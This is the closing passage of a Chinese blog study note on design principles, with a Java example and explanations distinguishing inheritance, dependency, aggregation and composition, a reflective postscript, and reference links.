<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B1</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="comment">// 继承,B1拥有A的所有方法</span></span><br><span class="line">    <span class="comment">// 但是这种耦合性太强</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B2</span></span>&#123;</span><br><span class="line">    <span class="comment">// 依赖</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">func1B</span><span class="params">(A a)</span></span>&#123;</span><br><span class="line">        a.func1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B3</span></span>&#123;</span><br><span class="line">    <span class="comment">// 聚合</span></span><br><span class="line">    <span class="keyword">private</span> A a;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setA</span><span class="params">(A a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">func1B</span><span class="params">()</span></span>&#123;</span><br><span class="line">        a.func1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B4</span></span>&#123;</span><br><span class="line">    <span class="comment">//组合</span></span><br><span class="line">    <span class="keyword">private</span> A a = <span class="keyword">new</span> A();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">func1B</span><span class="params">()</span></span>&#123;</span><br><span class="line">        a.func1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依赖：</p>
<p>类B使用到了另一个类A，而这种使用关系是具有偶然性的、临时性的、非常弱的，但是A类的变化会影响到B。表现为：A作为参数被B方法调用</p>
<p>聚合：</p>
<p>体现的是整体与部分、拥有的关系，即has-a的关系，此时整体与部分之间是可分离的，他们可以具有各自的生命周期，部分可以属于多个整体对象，也可以为多个整体对象共享。表现为：A作为B的类属性。</p>
<p>组合：</p>
<p>体现的是一种contains-a的关系，这种关系比聚合更强，也称为强聚合；他同样体现整体与部分间的关系，但此时整体与部分是不可分的，整体的生命周期结束也就意味着部分的生命周期结束；比如你和你的大脑。表现为：A作为B的类属性。</p>
<p>参见参考资料。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这一份笔记写的极为痛苦。所有的原则都没有难理解的地方。但总觉得如同隔靴搔痒，既不能完全理解原则，也反复意识到自己原来的代码中的各种问题，还会在转瞬之间想“卧槽这种情况改怎么改才能符合原则？根本没法改啊！” 只能寄托于假设自己学的还不到位，等学完23种设计模式，在加上大量的工程项目，再经常回顾思考，或许能理解的更加深入一些。思而不学则殆。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>维基百科</p>
<blockquote>
<ol>
<li><a href="https://zh.wikipedia.org/wiki/%E5%8D%95%E4%B8%80%E5%8A%9F%E8%83%BD%E5%8E%9F%E5%88%99" target="_blank" rel="noopener">单一功能原则</a></li>
<li><a href="https://zh.wikipedia.org/zh-cn/%E6%8E%A5%E5%8F%A3%E9%9A%94%E7%A6%BB%E5%8E%9F%E5%88%99#cite_note-ASD-1" target="_blank" rel="noopener">接口隔离原则</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E4%BE%9D%E8%B5%96%E5%8F%8D%E8%BD%AC%E5%8E%9F%E5%88%99" target="_blank" rel="noopener">依赖反转原则</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%87%8C%E6%B0%8F%E6%9B%BF%E6%8D%A2%E5%8E%9F%E5%88%99" target="_blank" rel="noopener">里氏替换原则</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E9%97%AD%E5%8E%9F%E5%88%99" target="_blank" rel="noopener">开闭原则</a></li>
</ol>
</blockquote>
<p><a href="https://www.bilibili.com/video/BV1G4411c7N4?p=5" target="_blank" rel="noopener">尚硅谷Java设计模式</a></p>
<p><a href="https://www.jianshu.com/p/fe949c2f081a" target="_blank" rel="noopener">继承、实现、依赖、关联、聚合、组合的联系与区别</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>乘龙术</category>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>设计模式</tag>
        <tag>SOLID</tag>
      </tags>
  </entry>
</search>
